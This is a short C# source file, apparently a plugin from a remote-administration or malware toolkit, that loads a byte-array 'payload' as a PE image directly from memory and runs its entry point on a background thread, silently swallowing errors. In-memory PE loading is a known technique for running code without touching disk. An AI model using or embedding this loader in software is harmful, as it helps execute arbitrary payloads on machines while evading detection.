using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class NativePE
    {
        internal static bool LoadPE(byte[] payload) 
        {
            Thread thread = new Thread(() => 
            {
                try
                {
                    DLLFromMemory exe = new DLLFromMemory(payload);
                    exe.MemoryCallEntryPoint();
                    exe.Dispose();
                }
                catch {}
            });

            thread.Start();

            if (thread.IsAlive)
                return true;
            return false;
        }
    }
}
